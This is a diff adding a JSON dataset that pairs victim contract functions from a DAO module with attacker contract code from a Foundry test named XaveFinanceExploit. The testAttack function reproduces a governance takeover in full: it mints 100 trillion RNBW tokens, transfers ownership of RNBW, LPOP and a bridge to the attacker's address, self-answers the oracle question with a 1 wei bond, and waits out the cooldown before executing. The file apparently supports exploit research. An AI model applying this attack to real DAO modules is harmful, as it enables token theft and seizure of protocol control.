@@ -1,0 +1,142 @@
+[
+  {
+    "contract/interface": "IDaoModule",
+    "source_type": "victim_contract",
+    "function_name": "addProposal",
+    "original_code": "    function addProposal(string memory proposalId, bytes32[] memory txHashes) public {\n        addProposalWithNonce(proposalId, txHashes, 0);\n    }\n\n    /// @dev Function to add a proposal that should be considered for execution\n    /// @param proposalId Id that should identify the proposal uniquely\n    /// @param txHashes EIP-712 hashes of the transactions that should be executed\n    /// @param nonce Nonce that should be used when asking the question on the oracle\n    function addProposalWithNonce(string memory proposalId, bytes32[] memory txHashes, uint256 nonce) public {\n        // We load some storage variables into memory to save gas\n        uint256 templateId = template;\n        uint32 timeout = questionTimeout;\n        address arbitrator = questionArbitrator;\n        // We generate the question string used for the oracle\n        string memory question = buildQuestion(proposalId, txHashes);\n        bytes32 questionHash = keccak256(bytes(question));\n        if (nonce > 0) {\n            // Previous nonce must have been invalidated by the oracle.\n            // However, if the proposal was internally invalidated, it should not be possible to ask it again.\n            bytes32 currentQuestionId = questionIds[questionHash];\n            require(currentQuestionId != INVALIDATED, \"This proposal has been marked as invalid\");\n            require(oracle.resultFor(currentQuestionId) == INVALIDATED, \"Previous proposal was not invalidated\");\n        } else {\n            require(questionIds[questionHash] == bytes32(0), \"Proposal has already been submitted\");\n        }\n        bytes32 expectedQuestionId = getQuestionId(\n            templateId, question, arbitrator, timeout, 0, nonce\n        );\n        // Set the question hash for this quesion id\n        questionIds[questionHash] = expectedQuestionId;\n        // Ask the question with a starting time of 0, so that it can be immediately answered\n        bytes32 questionId = oracle.askQuestion(templateId, question, arbitrator, timeout, 0, nonce);\n        require(expectedQuestionId == questionId, \"Unexpected question id\");\n        emit ProposalQuestionCreated(questionId, proposalId);\n    }\n\n    /// @dev Marks a proposal as invalid, preventing execution of the connected transactions\n    /// @param proposalId Id that should identify the proposal uniquely\n    /// @param txHashes EIP-712 hashes of the transactions that should be executed\n    /// @notice This can only be called by the executor\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDaoModule",
+    "source_type": "victim_contract",
+    "function_name": "buildQuestion",
+    "original_code": "    function buildQuestion(string memory proposalId, bytes32[] memory txHashes) public pure returns(string memory) {\n        string memory txsHash = bytes32ToAsciiString(keccak256(abi.encodePacked(txHashes)));\n        return string(abi.encodePacked(proposalId, bytes3(0xe2909f), txsHash));\n    }\n\n    /// @dev Generate the question id.\n    /// @notice It is required that this is the same as for the oracle implementation used.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDaoModule",
+    "source_type": "victim_contract",
+    "function_name": "executeProposalWithIndex",
+    "original_code": "    function executeProposalWithIndex(string memory proposalId, bytes32[] memory txHashes, address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 txIndex) public {\n        // We use the hash of the question to check the execution state, as the other parameters might change, but the question not\n        bytes32 questionHash = keccak256(bytes(buildQuestion(proposalId, txHashes)));\n        // Lookup question id for this proposal\n        bytes32 questionId = questionIds[questionHash];\n        // Question hash needs to set to be eligible for execution\n        require(questionId != bytes32(0), \"No question id set for provided proposal\");\n        require(questionId != INVALIDATED, \"Proposal has been invalidated\");\n\n        bytes32 txHash = getTransactionHash(to, value, data, operation, txIndex);\n        require(txHashes[txIndex] == txHash, \"Unexpected transaction hash\");\n\n        // Check that the result of the question is 1 (true)\n        require(oracle.resultFor(questionId) == bytes32(uint256(1)), \"Transaction was not approved\");\n        uint256 minBond = minimumBond;\n        require(minBond == 0 || minBond <= oracle.getBond(questionId), \"Bond on question not high enough\");\n        uint32 finalizeTs = oracle.getFinalizeTS(questionId);\n        // The answer is valid in the time after the cooldown and before the expiration time (if set).\n        require(finalizeTs + uint256(questionCooldown) < block.timestamp, \"Wait for additional cooldown\");\n        uint32 expiration = answerExpiration;\n        require(expiration == 0 || finalizeTs + uint256(expiration) >= block.timestamp, \"Answer has expired\");\n        // Check this is either the first transaction in the list or that the previous question was already approved\n        require(txIndex == 0 || executedProposalTransactions[questionHash][txHashes[txIndex - 1]], \"Previous transaction not executed yet\");\n        // Check that this question was not executed yet\n        require(!executedProposalTransactions[questionHash][txHash], \"Cannot execute transaction again\");\n        // Mark transaction as executed\n        executedProposalTransactions[questionHash][txHash] = true;\n        // Execute the transaction via the executor.\n        require(executor.execTransactionFromModule(to, value, data, operation), \"Module transaction failed\");\n    }\n\n    /// @dev Build the question by combining the proposalId and the hex string of the hash of the txHashes\n    /// @param proposalId Id of the proposal that proposes to execute the transactions represented by the txHashes\n    /// @param txHashes EIP-712 Hashes of the transactions that should be executed\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDaoModule",
+    "source_type": "victim_contract",
+    "function_name": "getTransactionHash",
+    "original_code": "    function getTransactionHash(address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 nonce) public view returns(bytes32) {\n        return keccak256(generateTransactionHashData(to, value, data, operation, nonce));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDaoModule",
+    "source_type": "victim_contract",
+    "function_name": "questionIds",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IRealitio",
+    "source_type": "victim_contract",
+    "function_name": "submitAnswer",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPrimaryBridge",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 15_704_736);\n        // Adding labels to improve stack traces' readability\n        vm.label(address(RNBW_TOKEN), \"RNBW_TOKEN\");\n        vm.label(address(LPOP_TOKEN), \"LPOP_TOKEN\");\n        vm.label(address(PRIMARY_BRIDGE), \"PRIMARY_BRIDGE\");\n        vm.label(address(DAO_MODULE), \"DAO_MODULE\");\n        vm.label(address(REALITIO), \"REALITIO\");\n        vm.label(ATTACKER_EOA, \"ATTACKER_EOA\");\n        vm.label(ATTACKER_CONTRACT, \"ATTACKER_CONTRACT\");\n        vm.label(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E, \"XAVE_GNOSIS_SAFE_MULTISIG\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "XaveFinanceExploit",
+    "source_type": "attacker_contract",
+    "function_name": "testAttack",
+    "original_code": "    function testAttack() public {\n        // tx to mint 100,000,000,000,000 RNBW tokens\n        bytes32 tx0 = DAO_MODULE.getTransactionHash(\n            address(RNBW_TOKEN),\n            0,\n            encodeWithSignature_mint(ATTACKER_EOA, 100_000_000_000_000_000_000_000_000_000_000),\n            //hex\"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000\",\n            Enum.Operation(0),\n            0\n        );\n\n        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx1 = DAO_MODULE.getTransactionHash(\n            address(RNBW_TOKEN),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            1\n        );\n\n        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx2 = DAO_MODULE.getTransactionHash(\n            address(LPOP_TOKEN),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            2\n        );\n\n        // tx to transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        bytes32 tx3 = DAO_MODULE.getTransactionHash(\n            address(PRIMARY_BRIDGE),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            3\n        );\n\n        // the txIDs generated using getTransactionHash()\n        bytes32[] memory txIDs = new bytes32[](4);\n        txIDs[0] = tx0;\n        txIDs[1] = tx1;\n        txIDs[2] = tx2;\n        txIDs[3] = tx3;\n\n        DAO_MODULE.addProposal(\"2\", txIDs);\n        string memory q = DAO_MODULE.buildQuestion(\"2\", txIDs);\n        bytes32 qID = DAO_MODULE.questionIds(keccak256(bytes(q)));\n        REALITIO.submitAnswer{value: 1}(qID, bytes32(uint256(1)), 0);\n\n        vm.warp(block.timestamp + 24 * 60 * 60);\n\n        emit log_named_address(\"[Before proposal Execution] Owner of $RNBW: \", RNBW_TOKEN.owner());\n        emit log_named_address(\"[Before proposal Execution] Owner of $LPOP: \", LPOP_TOKEN.owner());\n        emit log_named_address(\"[Before proposal Execution] Owner of PrimaryBridge: \", PRIMARY_BRIDGE.owner());\n        emit log_named_decimal_uint(\n            \"[Before proposal Execution] Attacker's $RNBW Token Balance: \", RNBW_TOKEN.balanceOf(ATTACKER_EOA), 18\n        );\n\n        vm.startPrank(ATTACKER_CONTRACT);\n\n        // Execute mint 100,000,000,000,000 RNBW tokens\n        DAO_MODULE.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            address(RNBW_TOKEN),\n            0,\n            encodeWithSignature_mint(ATTACKER_EOA, 100_000_000_000_000_000_000_000_000_000_000),\n            //hex\"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000\",\n            Enum.Operation(0),\n            0\n        );\n\n        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        DAO_MODULE.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            address(RNBW_TOKEN),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            1\n        );\n\n        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        DAO_MODULE.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            address(LPOP_TOKEN),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            2\n        );\n\n        // Execute transferOwnership() to ATTACKER_EOA (0x0f44f3489D17e42ab13A6beb76E57813081fc1E2)\n        DAO_MODULE.executeProposalWithIndex(\n            \"2\",\n            txIDs,\n            address(PRIMARY_BRIDGE),\n            0,\n            encodeWithSignature_transferOwnership(ATTACKER_EOA),\n            //hex\"f2fde38b0000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e2\",\n            Enum.Operation(0),\n            3\n        );\n\n        vm.stopPrank();\n\n        emit log_string(\"--------------------------------------------------------------\");\n        emit log_named_address(\"[After proposal Execution] Owner of $RNBW: \", RNBW_TOKEN.owner());\n        emit log_named_address(\"[After proposal Execution] Owner of $LPOP: \", LPOP_TOKEN.owner());\n        emit log_named_address(\"[After proposal Execution] Owner of PrimaryBridge: \", PRIMARY_BRIDGE.owner());\n        emit log_named_decimal_uint(\n            \"[After proposal Execution] Attacker's $RNBW Token Balance: \", RNBW_TOKEN.balanceOf(ATTACKER_EOA), 18\n        );\n    }\n",
+    "description": ""
+  }
+]
